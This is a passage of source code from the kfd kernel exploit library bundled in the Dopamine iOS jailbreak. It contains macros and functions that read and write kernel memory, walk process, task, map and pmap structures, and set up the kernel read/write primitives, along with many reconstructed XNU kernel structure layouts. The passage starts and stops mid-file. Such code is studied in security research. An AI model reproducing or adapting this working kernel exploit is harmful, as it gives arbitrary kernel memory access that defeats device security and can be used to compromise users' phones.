        timersub(&tv_end, &tv_start, &tv_diff);     \
        print_timer(&tv_diff);                      \
    } while (0)

#else /* CONFIG_TIMER */

#define timer_start()
#define timer_end()

#endif /* CONFIG_TIMER */

/*
 * Helper allocation macros.
 */

#define malloc_bzero(size)               \
    ({                                   \
        void* pointer = malloc(size);    \
        assert(pointer != NULL);         \
        bzero(pointer, size);            \
        pointer;                         \
    })

#define bzero_free(pointer, size)    \
    do {                             \
        bzero(pointer, size);        \
        free(pointer);               \
        pointer = NULL;              \
    } while (0)

#endif /* common_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/info.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef info_h
#define info_h

#include "info/dynamic_info.h"
#include "info/static_info.h"

/*
 * Note that these macros assume that the kfd pointer is in scope.
 */
#define dynamic_info(field_name)    (dynamic_system_info.field_name)
#define T1SZ_BOOT dynamic_info(device__T1SZ_BOOT)
#define ARM_16K_TT_L1_INDEX_MASK dynamic_info(device__ARM_TT_L1_INDEX_MASK)

#define dynamic_kget(field_name, object_kaddr)                                    \
    ({                                                                            \
        u64 tmp_buffer = 0;                                                       \
        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);         \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));    \
        tmp_buffer;                                                               \
    })

#define dynamic_kset(field_name, new_value, object_kaddr)                          \
    do {                                                                           \
        u64 tmp_buffer = new_value;                                                \
        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);          \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));    \
    } while (0)

#define static_kget(object_name, field_name, object_kaddr)                            \
    ({                                                                                \
        u64 tmp_buffer = 0;                                                           \
        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));        \
        tmp_buffer;                                                                   \
    })

#define static_kset(object_name, field_name, new_value, object_kaddr)                 \
    do {                                                                              \
        u64 tmp_buffer = new_value;                                                   \
        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));       \
    } while (0)

const char info_copy_sentinel[] = "p0up0u was here";
const u64 info_copy_sentinel_size = sizeof(info_copy_sentinel);

void info_init(struct kfd* kfd)
{
    /*
     * Initialize the kfd->info.copy substructure.
     *
     * Note that the vm_copy() call in krkw_helper_grab_free_pages() makes the following assumptions:
     * - The size of the copy must be strictly greater than msg_ool_size_small.
     * - The source object must have a copy strategy of MEMORY_OBJECT_COPY_NONE.
     * - The destination object must have a copy strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
     */
    kfd->info.copy.size = pages(4);
    assert(kfd->info.copy.size > msg_ool_size_small);
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
    for (u64 offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
    }

    /*
     * Initialize the kfd->info.env substructure.
     */
    kfd->info.env.pid = getpid();
    print_i32(kfd->info.env.pid);

    thread_identifier_info_data_t data = {};
    thread_info_t info = (thread_info_t)(&data);
    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
    kfd->info.env.tid = data.thread_id;
    print_u64(kfd->info.env.tid);

    usize size1 = sizeof(kfd->info.env.maxfilesperproc);
    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
    print_u64(kfd->info.env.maxfilesperproc);

    struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));
}

void info_run(struct kfd* kfd)
{
    timer_start();

    /*
     * current_task()
     */
    assert(kfd->info.kaddr.current_proc);
    if (dynamic_info(proc__task)) {
        kfd->info.kaddr.current_task = UNSIGN_PTR(dynamic_kget(proc__task, kfd->info.kaddr.current_proc));
    }
    else {
        kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + dynamic_info(proc__object_size);
    }
    print_x64(kfd->info.kaddr.current_proc);
    print_x64(kfd->info.kaddr.current_task);

    /*
     * current_map()
     */
    u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.current_task);
    kfd->info.kaddr.current_map = UNSIGN_PTR(signed_map_kaddr);
    print_x64(kfd->info.kaddr.current_map);
    
    /*
     * current_pmap()
     */
    u64 signed_pmap_kaddr = dynamic_kget(vm_map__pmap, kfd->info.kaddr.current_map);
    kfd->info.kaddr.current_pmap = UNSIGN_PTR(signed_pmap_kaddr);
    print_x64(kfd->info.kaddr.current_pmap);

    if (kfd->info.kaddr.kernel_proc) {
        /*
         * kernel_task()
         */
        if (dynamic_info(proc__task)) {
            kfd->info.kaddr.kernel_task = UNSIGN_PTR(dynamic_kget(proc__task, kfd->info.kaddr.kernel_proc));
        }
        else {
            kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + dynamic_info(proc__object_size);
        }
        print_x64(kfd->info.kaddr.kernel_proc);
        print_x64(kfd->info.kaddr.kernel_task);

        /*
         * kernel_map()
         */
        u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.kernel_task);
        kfd->info.kaddr.kernel_map = UNSIGN_PTR(signed_map_kaddr);
        print_x64(kfd->info.kaddr.kernel_map);

        /*
         * kernel_pmap()
         */
        u64 signed_pmap_kaddr = dynamic_kget(vm_map__pmap, kfd->info.kaddr.kernel_map);
        kfd->info.kaddr.kernel_pmap = UNSIGN_PTR(signed_pmap_kaddr);
        print_x64(kfd->info.kaddr.kernel_pmap);
    }

    timer_end();
}

void info_free(struct kfd* kfd)
{
    if(kfd->info.copy.src_uaddr) assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
    if(kfd->info.copy.dst_uaddr) assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
}

#endif /* info_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/info/dynamic_info.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef dynamic_info_h
#define dynamic_info_h

struct dynamic_info {
    bool kread_kqueue_workloop_ctl_supported;
    bool krkw_iosurface_supported;
    bool perf_supported;
    u64 kernelcache__static_base;
    // struct proc
    u64 proc__p_list__le_prev;
    u64 proc__p_list__le_next;
    u64 proc__task;
    u64 proc__p_pid;
    u64 proc__p_fd__fd_ofiles;
    u64 proc__object_size;
    // struct task
    u64 task__map;
    // struct vm_map
    u64 vm_map__hdr_links_prev;
    u64 vm_map__hdr_links_next;
    u64 vm_map__min_offset;
    u64 vm_map__max_offset;
    u64 vm_map__hdr_nentries;
    u64 vm_map__hdr_nentries_u64;
    u64 vm_map__hdr_rb_head_store_rbh_root;
    u64 vm_map__pmap;
    u64 vm_map__hint;
    u64 vm_map__hole_hint;
    u64 vm_map__holes_list;
    u64 vm_map__object_size;
    // struct thread
    u64 thread__thread_id;
    // struct IOSurface
    u64 IOSurface__isa;
    u64 IOSurface__pixelFormat;
    u64 IOSurface__allocSize;
    u64 IOSurface__useCountPtr;
    u64 IOSurface__indexedTimestampPtr;
    u64 IOSurface__readDisplacement;
    // kernelcache static addresses (IOSurface)
    u64 kernelcache__allproc;
    // kernelcache static addresses (perf)
    u64 kernelcache__cdevsw;                          // "spec_open type" or "Can't mark ptc as kqueue ok"
    u64 kernelcache__gPhysBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 kernelcache__gPhysSize;                       // (gPhysBase + 0x8)
    u64 kernelcache__gVirtBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 kernelcache__perfmon_dev_open;                // "perfmon: attempt to open unsupported source: 0x%x"
    u64 kernelcache__perfmon_devices;                 // "perfmon: %s: devfs_make_node_clone failed"
    u64 kernelcache__ptov_table;                      // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 kernelcache__vn_kqfilter;                     // "Invalid knote filter on a vnode!"
    // address translation
    u64 device__T1SZ_BOOT;
    u64 device__ARM_TT_L1_INDEX_MASK;
};

struct dynamic_info dynamic_system_info = { 0 };

#define ARM64_LINK_ADDR dynamic_info(kernelcache__static_base)

#endif /* dynamic_info_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/info/static_info.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef static_info_h
#define static_info_h

/*
 * osfmk/arm64/proc_reg.h
 */

#define ARM_PGSHIFT    (14ull)
#define ARM_PGBYTES    (1ull << ARM_PGSHIFT)
#define ARM_PGMASK     (ARM_PGBYTES - 1ull)

#define AP_RWNA    (0x0ull << 6)
#define AP_RWRW    (0x1ull << 6)
#define AP_RONA    (0x2ull << 6)
#define AP_RORO    (0x3ull << 6)

#define ARM_PTE_TYPE              0x0000000000000003ull
#define ARM_PTE_TYPE_VALID        0x0000000000000003ull
#define ARM_PTE_TYPE_MASK         0x0000000000000002ull
#define ARM_TTE_TYPE_L3BLOCK      0x0000000000000002ull
#define ARM_PTE_ATTRINDX          0x000000000000001cull
#define ARM_PTE_NS                0x0000000000000020ull
#define ARM_PTE_AP                0x00000000000000c0ull
#define ARM_PTE_SH                0x0000000000000300ull
#define ARM_PTE_AF                0x0000000000000400ull
#define ARM_PTE_NG                0x0000000000000800ull
#define ARM_PTE_ZERO1             0x000f000000000000ull
#define ARM_PTE_HINT              0x0010000000000000ull
#define ARM_PTE_PNX               0x0020000000000000ull
#define ARM_PTE_NX                0x0040000000000000ull
#define ARM_PTE_ZERO2             0x0380000000000000ull
#define ARM_PTE_WIRED             0x0400000000000000ull
#define ARM_PTE_WRITEABLE         0x0800000000000000ull
#define ARM_PTE_ZERO3             0x3000000000000000ull
#define ARM_PTE_COMPRESSED_ALT    0x4000000000000000ull
#define ARM_PTE_COMPRESSED        0x8000000000000000ull

#define ARM_TTE_VALID         0x0000000000000001ull
#define ARM_TTE_TYPE_MASK     0x0000000000000002ull
#define ARM_TTE_TYPE_TABLE    0x0000000000000002ull
#define ARM_TTE_TYPE_BLOCK    0x0000000000000000ull
#define ARM_TTE_TABLE_MASK    0x0000fffffffff000ull
#define ARM_TTE_PA_MASK       0x0000fffffffff000ull

#define ARM_16K_TT_L0_SIZE          0x0000800000000000ull
#define ARM_16K_TT_L0_OFFMASK       0x00007fffffffffffull
#define ARM_16K_TT_L0_SHIFT         47
#define ARM_16K_TT_L0_INDEX_MASK    0x0000800000000000ull

#define ARM_16K_TT_L1_SIZE          0x0000001000000000ull
#define ARM_16K_TT_L1_OFFMASK       0x0000000fffffffffull
#define ARM_16K_TT_L1_SHIFT         36

#define ARM_16K_TT_L2_SIZE          0x0000000002000000ull
#define ARM_16K_TT_L2_OFFMASK       0x0000000001ffffffull
#define ARM_16K_TT_L2_SHIFT         25
#define ARM_16K_TT_L2_INDEX_MASK    0x0000000ffe000000ull

#define ARM_16K_TT_L3_SIZE          0x0000000000004000ull
#define ARM_16K_TT_L3_OFFMASK       0x0000000000003fffull
#define ARM_16K_TT_L3_SHIFT         14
#define ARM_16K_TT_L3_INDEX_MASK    0x0000000001ffc000ull

/*
 * osfmk/arm/pmap/pmap_pt_geometry.h
 */

#define PMAP_TT_L0_LEVEL    0x0
#define PMAP_TT_L1_LEVEL    0x1
#define PMAP_TT_L2_LEVEL    0x2
#define PMAP_TT_L3_LEVEL    0x3

/*
 * osfmk/kern/bits.h
 */

#define BIT(b)    (1ULL << (b))

/*
 * osfmk/arm/machine_routines.h
 */

#define ONES(x)          (BIT((x))-1)
#define PTR_MASK         ONES(64-T1SZ_BOOT)
#define PAC_MASK         (~PTR_MASK)
#define SIGN(p)          ((p) & BIT(55))
#define UNSIGN_PTR(p)    (SIGN(p) ? ((p) | PAC_MASK) : ((p) & ~PAC_MASK))

/*
 * osfmk/kern/kalloc.h
 */

#define KHEAP_MAX_SIZE    (32ull * 1024ull)

/*
 * osfmk/ipc/ipc_init.c
 */

const vm_size_t msg_ool_size_small = KHEAP_MAX_SIZE;

/*
 * osfmk/vm/vm_map_store.h
 */

struct vm_map_store {
    struct {
        u64 rbe_left;
        u64 rbe_right;
        u64 rbe_parent;
    } entry;
};

struct vm_map_links {
    u64 prev;
    u64 next;
    u64 start;
    u64 end;
};

struct vm_map_header {
    struct vm_map_links links;
    i32 nentries;
    u16 page_shift;
    u16
        entries_pageable:1,
        __padding:15;
    struct {
        u64 rbh_root;
    } rb_head_store;
};

/*
 * osfmk/vm/vm_map.h
 */

struct vm_map_entry {
    struct vm_map_links links;
    struct vm_map_store store;
    union {
        u64 vme_object_value;
        struct {
            u64 vme_atomic:1;
            u64 is_sub_map:1;
            u64 vme_submap:60;
        };
        struct {
            u32 vme_ctx_atomic:1;
            u32 vme_ctx_is_sub_map:1;
            u32 vme_context:30;
            u32 vme_object;
        };
    };
    u64
        vme_alias:12,
        vme_offset:52,
        is_shared:1,
        __unused1:1,
        in_transition:1,
        needs_wakeup:1,
        behavior:2,
        needs_copy:1,
        protection:3,
        used_for_tpro:1,
        max_protection:4,
        inheritance:2,
        use_pmap:1,
        no_cache:1,
        vme_permanent:1,
        superpage_size:1,
        map_aligned:1,
        zero_wired_pages:1,
        used_for_jit:1,
        pmap_cs_associated:1,
        iokit_acct:1,
        vme_resilient_codesign:1,
        vme_resilient_media:1,
        __unused2:1,
        vme_no_copy_on_read:1,
        translated_allow_execute:1,
        vme_kernel_object:1;
    u16 wired_count;
    u16 user_wired_count;
};

/*
 * osfmk/arm/pmap/pmap.h
 */

struct pmap {
    u64 tte;
    u64 ttep;
    u64 min;
    u64 max;
    u64 pmap_pt_attr;
    u64 ledger;
    u64 rwlock[2];
    struct {
        u64 next;
        u64 prev;
    } pmaps;
    u64 tt_entry_free;
    u64 nested_pmap;
    u64 nested_region_addr;
    u64 nested_region_size;
    u64 nested_region_true_start;
    u64 nested_region_true_end;
    u64 nested_region_asid_bitmap;
    u32 nested_region_asid_bitmap_size;
    u64 reserved0;
    u64 reserved1;
    u64 reserved2;
    u64 reserved3;
    i32 ref_count;
    i32 nested_count;
    u32 nested_no_bounds_refcnt;
    u16 hw_asid;
    u8 sw_asid;
    bool reserved4;
    bool pmap_vm_map_cs_enforced;
    bool reserved5;
    u32 reserved6;
    u8 reserved7;
    u8 type;
    bool reserved8;
    bool reserved9;
    bool is_rosetta;
    bool nx_enabled;
    bool is_64bit;
    bool nested_has_no_bounds_ref;
    bool nested_bounds_set;
    bool disable_jop;
    bool reserved11;
};

/*
 * bsd/kern/kern_guarded.c
 */

#define GUARD_REQUIRED (1u << 1)

/*
 * bsd/sys/file_internal.h
 */

struct fileproc_guard {
    u64 fpg_wset;
    u64 fpg_guard;
};

struct fileproc {
    u32 fp_iocount;
    u32 fp_vflags;
    u16 fp_flags;
    u16 fp_guard_attrs;
    u64 fp_glob;
    union {
        u64 fp_wset;
        u64 fp_guard;
    };
};

typedef enum {
    DTYPE_VNODE = 1,
    DTYPE_SOCKET,
    DTYPE_PSXSHM,
    DTYPE_PSXSEM,
    DTYPE_KQUEUE,
    DTYPE_PIPE,
    DTYPE_FSEVENTS,
    DTYPE_ATALK,
    DTYPE_NETPOLICY,
    DTYPE_CHANNEL,
    DTYPE_NEXUS
} file_type_t;

struct fileops {
    file_type_t fo_type;
    void* fo_read;
    void* fo_write;
    void* fo_ioctl;
    void* fo_select;
    void* fo_close;
    void* fo_kqfilter;
    void* fo_drain;
};

struct fileglob {
    struct {
        u64 le_next;
        u64 le_prev;
    } f_msglist;
    u32 fg_flag;
    u32 fg_count;
    u32 fg_msgcount;
    i32 fg_lflags;
    u64 fg_cred;
    u64 fg_ops;
    i64 fg_offset;
    u64 fg_data;
    u64 fg_vn_data;
    u64 fg_lock[2];
};

/*
 * bsd/sys/perfmon_private.h
 */

struct perfmon_layout {
    u16 pl_counter_count;
    u16 pl_fixed_offset;
    u16 pl_fixed_count;
    u16 pl_unit_count;
    u16 pl_reg_count;
    u16 pl_attr_count;
};

typedef char perfmon_name_t[16];

struct perfmon_event {
    char pe_name[32];
    u64 pe_number;
    u16 pe_counter;
};

struct perfmon_attr {
    perfmon_name_t pa_name;
    u64 pa_value;
};

struct perfmon_spec {
    struct perfmon_event* ps_events;
    struct perfmon_attr* ps_attrs;
    u16 ps_event_count;
    u16 ps_attr_count;
};

enum perfmon_ioctl {
    PERFMON_CTL_ADD_EVENT = _IOWR('P', 5, struct perfmon_event),
    PERFMON_CTL_SPECIFY = _IOWR('P', 10, struct perfmon_spec),
};

/*
 * osfmk/kern/perfmon.h
 */

enum perfmon_kind {
    perfmon_cpmu,
    perfmon_upmu,
    perfmon_kind_max,
};

struct perfmon_source {
    const char* ps_name;
    const perfmon_name_t* ps_register_names;
    const perfmon_name_t* ps_attribute_names;
    struct perfmon_layout ps_layout;
    enum perfmon_kind ps_kind;
    bool ps_supported;
};

#define PERFMON_SPEC_MAX_ATTR_COUNT    (32)

/*
 * osfmk/machine/machine_perfmon.h
 */

struct perfmon_counter {
    u64 pc_number;
};

struct perfmon_config {
    struct perfmon_source* pc_source;
    struct perfmon_spec pc_spec;
    u16 pc_attr_ids[PERFMON_SPEC_MAX_ATTR_COUNT];
    struct perfmon_counter* pc_counters;
    u64 pc_counters_used;
    u64 pc_attrs_used;
    bool pc_configured:1;
};

/*
 * bsd/dev/dev_perfmon.c
 */

struct perfmon_device {
    void* pmdv_copyout_buf;
    u64 pmdv_mutex[2];
    struct perfmon_config* pmdv_config;
    bool pmdv_allocated;
};

/*
 * bsd/pthread/workqueue_syscalls.h
 */

#define KQ_WORKLOOP_CREATE     0x01
#define KQ_WORKLOOP_DESTROY    0x02

#define KQ_WORKLOOP_CREATE_SCHED_PRI      0x01
#define KQ_WORKLOOP_CREATE_SCHED_POL      0x02
#define KQ_WORKLOOP_CREATE_CPU_PERCENT    0x04

struct kqueue_workloop_params {
    i32 kqwlp_version;
    i32 kqwlp_flags;
    u64 kqwlp_id;
    i32 kqwlp_sched_pri;
    i32 kqwlp_sched_pol;
    i32 kqwlp_cpu_percent;
    i32 kqwlp_cpu_refillms;
} __attribute__((packed));

/*
 * bsd/pthread/workqueue_internal.h
 */

struct workq_threadreq_s {
    union {
        u64 tr_entry[3];
        u64 tr_link[1];
        u64 tr_thread;
    };
    u16 tr_count;
    u8 tr_flags;
    u8 tr_state;
    u8 tr_qos;
    u8 tr_kq_override_index;
    u8 tr_kq_qos_index;
};

/*
 * bsd/sys/event.h
 */

struct kqtailq {
    u64 tqh_first;
    u64 tqh_last;
};

/*
 * bsd/sys/eventvar.h
 */

__options_decl(kq_state_t, u16, {
    KQ_SLEEP         = 0x0002,
    KQ_PROCWAIT      = 0x0004,
    KQ_KEV32         = 0x0008,
    KQ_KEV64         = 0x0010,
    KQ_KEV_QOS       = 0x0020,
    KQ_WORKQ         = 0x0040,
    KQ_WORKLOOP      = 0x0080,
    KQ_PROCESSING    = 0x0100,
    KQ_DRAIN         = 0x0200,
    KQ_DYNAMIC       = 0x0800,
    KQ_R2K_ARMED     = 0x1000,
    KQ_HAS_TURNSTILE = 0x2000,
});

struct kqueue {
    u64 kq_lock[2];
    kq_state_t kq_state;
    u16 kq_level;
    u32 kq_count;
    u64 kq_p;
    u64 kq_knlocks[1];
};

struct kqworkloop {
    struct kqueue kqwl_kqueue;
    struct kqtailq kqwl_queue[6];
    struct kqtailq kqwl_suppressed;
    struct workq_threadreq_s kqwl_request;
    u64 kqwl_preadopt_tg;
    u64 kqwl_statelock[2];
    u64 kqwl_owner;
    u32 kqwl_retains;
    u8 kqwl_wakeup_qos;
    u8 kqwl_iotier_override;
    u16 kqwl_preadopt_tg_needs_redrive;
    u64 kqwl_turnstile;
    u64 kqwl_dynamicid;
    u64 kqwl_params;
    u64 kqwl_hashlink[2];
};

/*
 * bsd/kern/posix_sem.c
 */

struct pseminfo {
    u32 psem_flags;
    u32 psem_usecount;
    u16 psem_mode;
    u32 psem_uid;
    u32 psem_gid;
    char psem_name[32];
    u64 psem_semobject;
    u64 psem_label;
    i32 psem_creator_pid;
    u64 psem_creator_uniqueid;
};

struct psemnode {
    u64 pinfo;
    u64 padding;
};

/*
 * osfmk/kern/sync_sema.h
 */

struct semaphore {
    struct {
        u64 next;
        u64 prev;
    } task_link;
    char waitq[24];
    u64 owner;
    u64 port;
    u32 ref_count;
    i32 count;
};

/*
 * bsd/sys/vnode_internal.h
 */

struct vnode {
    u64 v_lock[2];
    u64 v_freelist[2];
    u64 v_mntvnodes[2];
    u64 v_ncchildren[2];
    u64 v_nclinks[1];
    u64 v_defer_reclaimlist;
    u32 v_listflag;
    u32 v_flag;
    u16 v_lflag;
    u8 v_iterblkflags;
    u8 v_references;
    i32 v_kusecount;
    i32 v_usecount;
    i32 v_iocount;
    u64 v_owner;
    u16 v_type;
    u16 v_tag;
    u32 v_id;
    union {
        u64 vu_mountedhere;
        u64 vu_socket;
        u64 vu_specinfo;
        u64 vu_fifoinfo;
        u64 vu_ubcinfo;
    } v_un;
    // ...
};

/*
 * bsd/miscfs/specfs/specdev.h
 */

struct specinfo {
    u64 si_hashchain;
    u64 si_specnext;
    i64 si_flags;
    i32 si_rdev;
    i32 si_opencount;
    i32 si_size;
    i64 si_lastr;
    u64 si_devsize;
    u8 si_initted;
    u8 si_throttleable;
    u16 si_isssd;
    u32 si_devbsdunit;
    u64 si_throttle_mask;
};

/*
 * bsd/sys/proc_info.h
 */

#define PROC_INFO_CALL_LISTPIDS             0x1
#define PROC_INFO_CALL_PIDINFO              0x2
#define PROC_INFO_CALL_PIDFDINFO            0x3
#define PROC_INFO_CALL_KERNMSGBUF           0x4
#define PROC_INFO_CALL_SETCONTROL           0x5
#define PROC_INFO_CALL_PIDFILEPORTINFO      0x6
#define PROC_INFO_CALL_TERMINATE            0x7
#define PROC_INFO_CALL_DIRTYCONTROL         0x8
#define PROC_INFO_CALL_PIDRUSAGE            0x9
#define PROC_INFO_CALL_PIDORIGINATORINFO    0xa
#define PROC_INFO_CALL_LISTCOALITIONS       0xb
#define PROC_INFO_CALL_CANUSEFGHW           0xc
#define PROC_INFO_CALL_PIDDYNKQUEUEINFO     0xd
#define PROC_INFO_CALL_UDATA_INFO           0xe
#define PROC_INFO_CALL_SET_DYLD_IMAGES      0xf
#define PROC_INFO_CALL_TERMINATE_RSR        0x10

struct vinfo_stat {
    u32 vst_dev;
    u16 vst_mode;
    u16 vst_nlink;
    u64 vst_ino;
    u32 vst_uid;
    u32 vst_gid;
    i64 vst_atime;
    i64 vst_atimensec;
    i64 vst_mtime;
    i64 vst_mtimensec;
    i64 vst_ctime;
    i64 vst_ctimensec;
    i64 vst_birthtime;
    i64 vst_birthtimensec;
    i64 vst_size;
    i64 vst_blocks;
    i32 vst_blksize;
    u32 vst_flags;
    u32 vst_gen;
    u32 vst_rdev;
    i64 vst_qspare[2];
};

#define PROC_PIDFDVNODEINFO         1
#define PROC_PIDFDVNODEPATHINFO     2
#define PROC_PIDFDSOCKETINFO        3
#define PROC_PIDFDPSEMINFO          4
#define PROC_PIDFDPSHMINFO          5
#define PROC_PIDFDPIPEINFO          6
#define PROC_PIDFDKQUEUEINFO        7
#define PROC_PIDFDATALKINFO         8
#define PROC_PIDFDKQUEUE_EXTINFO    9
#define PROC_PIDFDCHANNELINFO       10

struct proc_fileinfo {
    u32 fi_openflags;
    u32 fi_status;
    i64 fi_offset;
    i32 fi_type;
    u32 fi_guardflags;
};

struct psem_info {
    struct vinfo_stat psem_stat;
    char psem_name[1024];
};

struct psem_fdinfo {
    struct proc_fileinfo pfi;
    struct psem_info pseminfo;
};

#define PROC_PIDDYNKQUEUE_INFO       0
#define PROC_PIDDYNKQUEUE_EXTINFO    1

struct kqueue_info {
    struct vinfo_stat kq_stat;
    u32 kq_state;
    u32 rfu_1;
};

struct kqueue_dyninfo {
    struct kqueue_info kqdi_info;
    u64 kqdi_servicer;
    u64 kqdi_owner;
    u32 kqdi_sync_waiters;
    u8 kqdi_sync_waiter_qos;
    u8 kqdi_async_qos;
    u16 kqdi_request_state;
    u8 kqdi_events_qos;
    u8 kqdi_pri;
    u8 kqdi_pol;
    u8 kqdi_cpupercent;
    u8 _kqdi_reserved0[4];
    u64 _kqdi_reserved1[4];
};

#endif /* static_info_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef krkw_h
#define krkw_h

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        u64 type_size = ((size) / (sizeof(type)));                                  \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kfd, kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#include "krkw/kread/kread_kqueue_workloop_ctl.h"
#include "krkw/kread/kread_sem_open.h"
#include "krkw/kread/kread_IOSurface.h"

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        u64 type_size = ((size) / (sizeof(type)));                             \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method(kfd, kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

#include "krkw/kwrite/kwrite_dup.h"
#include "krkw/kwrite/kwrite_sem_open.h"
#include "krkw/kwrite/kwrite_IOSurface.h"

// Forward declarations for helper functions.
void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
bool krkw_helper_grab_free_pages(struct kfd* kfd);
bool krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);

#define kread_method_case(method)                                       \
    case method: {                                                      \
        const char* method_name = #method;                              \
        print_string(method_name);                                      \
        kfd->kread.krkw_method_ops.init = method##_init;                \
        kfd->kread.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kread.krkw_method_ops.search = method##_search;            \
        kfd->kread.krkw_method_ops.kread = method##_kread;              \
        kfd->kread.krkw_method_ops.kwrite = NULL;                       \
        kfd->kread.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kread.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kread.krkw_method_ops.free = method##_free;                \
        break;                                                          \
    }

#define kwrite_method_case(method)                                       \
    case method: {                                                       \
        const char* method_name = #method;                               \
        print_string(method_name);                                       \
        kfd->kwrite.krkw_method_ops.init = method##_init;                \
        kfd->kwrite.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kwrite.krkw_method_ops.search = method##_search;            \
        kfd->kwrite.krkw_method_ops.kread = NULL;                        \
        kfd->kwrite.krkw_method_ops.kwrite = method##_kwrite;            \
        kfd->kwrite.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kwrite.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kwrite.krkw_method_ops.free = method##_free;                \
        break;                                                           \
    }

void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
{
    if (!dynamic_system_info.kread_kqueue_workloop_ctl_supported) {
        assert(kread_method != kread_kqueue_workloop_ctl);
    }
    
    if (!dynamic_system_info.krkw_iosurface_supported) {
        assert(kread_method != kread_IOSurface);
        assert(kwrite_method != kwrite_IOSurface);
    }

    if (kread_method == kread_sem_open) {
        assert(kwrite_method == kwrite_sem_open);
    }

    switch (kread_method) {
        kread_method_case(kread_kqueue_workloop_ctl)
        kread_method_case(kread_sem_open)
        kread_method_case(kread_IOSurface)
    }

    switch (kwrite_method) {
        kwrite_method_case(kwrite_dup)
        kwrite_method_case(kwrite_sem_open)
        kwrite_method_case(kwrite_IOSurface)
    }

    krkw_helper_init(kfd, &kfd->kread);
    krkw_helper_init(kfd, &kfd->kwrite);
}

bool krkw_run(struct kfd* kfd)
{
    if(krkw_helper_grab_free_pages(kfd) == false) return false;

    //timer_start();
    if(krkw_helper_run_allocate(kfd, &kfd->kread) == false) {
        krkw_helper_run_deallocate(kfd, &kfd->kread);
        if (kfd->kread.krkw_method_ops.deallocate == kread_sem_open_deallocate) {
            krkw_helper_run_deallocate(kfd, &kfd->kwrite);
        }
        return false;
    }
    if(krkw_helper_run_allocate(kfd, &kfd->kwrite) == false) {
        krkw_helper_run_deallocate(kfd, &kfd->kread);
        krkw_helper_run_deallocate(kfd, &kfd->kwrite);
        return false;
    }
    
    usleep(1000);
    krkw_helper_run_deallocate(kfd, &kfd->kread);
    krkw_helper_run_deallocate(kfd, &kfd->kwrite);
    //timer_end();
    return true;
}

void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    assert(kaddr >= 0xfffff00000000000);
    kfd->kread.krkw_method_ops.kread(kfd, kaddr, uaddr, size);
}

